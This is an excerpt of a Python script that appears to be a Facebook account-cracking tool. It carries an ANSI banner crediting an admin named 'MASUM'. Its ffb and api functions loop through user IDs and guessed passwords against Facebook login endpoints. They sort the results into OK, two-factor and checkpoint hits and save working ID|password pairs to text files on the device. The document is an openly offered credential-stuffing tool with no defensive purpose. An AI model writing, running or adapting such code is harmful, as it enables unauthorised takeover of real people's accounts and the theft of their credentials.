...
logo=("""\033[38;5;46m
    ...
    ██   ██     ██   ██     ██   ██ {X1}ＴＲＩＡＬ 
\033[38;5;196m───────────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m ADMIN    \033[38;5;196m : \x1b[38;5;46mMASUM
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m FACEBOOK\033[38;5;196m  :\x1b[38;5;46m MASUM.Jr
...
def main():
        ...
        linex()
        Masum = input(f' \033[38;5;48m➤\033[1;37m Choose an option :- ')
        if Masum in ['1','A']:
                __file__()
        elif Masum in ['2','B']:
                __random__()
...
def ffb(ids,names,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r\r{K} {A}[{E}Masum{A}] [{E}{loop}{B}/{E}{tl}{A}] {E}[OK:-{len(ok)}]');sys.stdout.flush()
        ...
        try:
                ...
                for fikr in pasx:
                        ...
                        if "c_user" in Masum:
                                ...
                                print('\r\r \033[38;5;46m[Masum-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Masum/OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ok.append(ids)
                                break
                        elif 'checkpoint' in Masum:
                                print('\r\r\x1b[1;90m [Masum-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r\r{K} {A}[{E}Masum{A}] [{E}{loop}{B}/{E}{tl}{A}] {E}[OK:-{len(ok)}]')
        sys.stdout.flush()
        try:
                for pas in pasx:
                        ...
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r\r {E}[Masum-OK] {str(uid)} | {pas}')
                                open('/sdcard/Masum/OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ok.append(str(uid))
                                break
                        elif twf in str(po):
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r \033[38;5;45m[Masum-2F] {str(uid)} | {pas}')
                                open('/sdcard/Masum/2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                tf.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r {D}[Masum-CP] {str(uid)} | {pas}')
                                open('/sdcard/Masum/CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
